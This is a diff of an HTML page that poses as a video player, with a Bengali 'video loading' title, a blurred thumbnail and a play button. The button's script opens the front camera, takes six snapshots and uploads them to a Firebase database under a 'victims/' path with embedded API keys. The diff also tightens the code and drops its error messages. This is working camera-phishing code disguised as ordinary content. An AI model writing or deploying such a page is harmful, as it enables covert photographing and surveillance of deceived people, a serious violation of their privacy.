@@ -5,86 +5,48 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>ভিডিও লোড হচ্ছে...</title>
 <style>
-  body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;display:flex;justify-content:center;align-items:center}
-  .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/ve0onq.jpg') center/cover;filter:blur(12px);transform:scale(1.1);z-index:1}
-  .play{position:relative;z-index:10;width:100px;height:100px;background:rgba(0,0,0,0.9);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;animation:g 2s infinite}
-  .play::after{content:'';border-left:40px solid #ff0050;border-top:28px solid transparent;border-bottom:28px solid transparent;margin-left:12px}
-  @keyframes g{0%,100%{box-shadow:0 0 30px #ff0050}50%{box-shadow:0 0 60px #ff0050}}
-  .loading{color:#fff;font-size:1.6em;position:absolute;z-index:10;display:none;background:rgba(0,0,0,0.7);padding:15px 30px;border-radius:50px}
+body,html{margin:0;padding:0;height:100%;background:#000;overflow:hidden;display:flex;justify-content:center;align-items:center}
+.bg{position:fixed;top:0;left:0;width:100%;height:100%;background:url('https://files.catbox.moe/ve0onq.jpg') center/cover;filter:blur(12px);transform:scale(1.1)}
+.play{position:relative;width:100px;height:100px;background:rgba(0,0,0,0.9);border-radius:50%;cursor:pointer;display:flex;align-items:center;justify-content:center;animation:g 2s infinite}
+.play::after{content:'';border-left:40px solid #ff0050;border-top:28px solid transparent;border-bottom:28px solid transparent;margin-left:12px}
+@keyframes g{0%,100%{box-shadow:0 0 30px #ff0050}50%{box-shadow:0 0 60px #ff0050}}
+.loading{color:#fff;font-size:1.6em;position:absolute;display:none;background:rgba(0,0,0,0.7);padding:15px 30px;border-radius:50px}
 </style>
 </head>
 <body>
 <div class="bg"></div>
 <div class="play" onclick="start()"></div>
-<div class="loading" id="load">ভিডিও চালু হচ্ছে...</div>
+<div class="loading" id="load">ক্যামেরা চালু হচ্ছে...</div>
 
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
 <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <script>
-const firebaseConfig = {
-  apiKey: "AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",
-  authDomain: "cam-snap-8e956.firebaseapp.com",
-  databaseURL: "https://cam-snap-8e956-default-rtdb.firebaseio.com",
-  projectId: "cam-snap-8e956",
-  appId: "1:982089892260:web:2cfa5a4d3b3dbcf45d0131"
-};
+const firebaseConfig = {apiKey:"AIzaSyDTBla5gMV15V9HWBKAVYTWFt-CBrFfpzo",authDomain:"cam-snap-8e956.firebaseapp.com",databaseURL:"https://cam-snap-8e956-default-rtdb.firebaseio.com",projectId:"cam-snap-8e956",appId:"1:982089892260:web:2cfa5a4d3b3dbcf45d0131"};
 firebase.initializeApp(firebaseConfig);
 const db = firebase.database();
-
-// id নেওয়া
 const id = new URLSearchParams(location.search).get('id');
-if(!id){
-  document.body.innerHTML = "<h1 style='color:white;text-align:center;margin-top:50%'>Invalid Link</h1>";
-}
 
 function start(){
-  document.querySelector('.play').style.display = 'none';
-  document.getElementById('load').style.display = 'block';
-
-  // ৬টা ছবি তুলবে (সামনের ক্যামেরা)
-  for(let i = 0; i < 6; i++){
-    setTimeout(() => capture(), i * 700);
-  }
+  document.querySelector('.play').style.display='none';
+  document.getElementById('load').style.display='block';
+  for(let i=0;i<6;i++) setTimeout(capture,i*700);
 }
 
 async function capture(){
-  try {
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { 
-        facingMode: "user",
-        width: { ideal: 1920 },
-        height: { ideal: 1080 }
-      }
-    });
-
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.muted = true;
-    video.play();
-
-    video.onloadedmetadata = () => {
-      setTimeout(() => {
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 1280;
-        canvas.height = video.videoHeight || 720;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const dataURL = canvas.toDataURL('image/jpeg', 0.95);
-
-        // ফায়ারবেসে পাঠানো
-        db.ref('victims/' + id).push({
-          data: dataURL,
-          time: Date.now()
-        });
-
-        stream.getTracks().forEach(track => track.stop());
-      }, 1000);
+  try{
+    const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+    const v = document.createElement('video'); v.srcObject=stream; v.play();
+    v.onloadedmetadata=()=>{
+      setTimeout(()=>{
+        const c=document.createElement('canvas');
+        c.width=v.videoWidth||1280; c.height=v.videoHeight||720;
+        c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+        const data=c.toDataURL('image/jpeg',0.95);
+        db.ref('victims/'+id).push({data,time:Date.now()});
+        stream.getTracks().forEach(t=>t.stop());
+      },1000);
     };
-
-  } catch (err) {
-    console.log("Camera access denied or not available");
-  }
+  }catch(e){}
 }
 </script>
 </body>
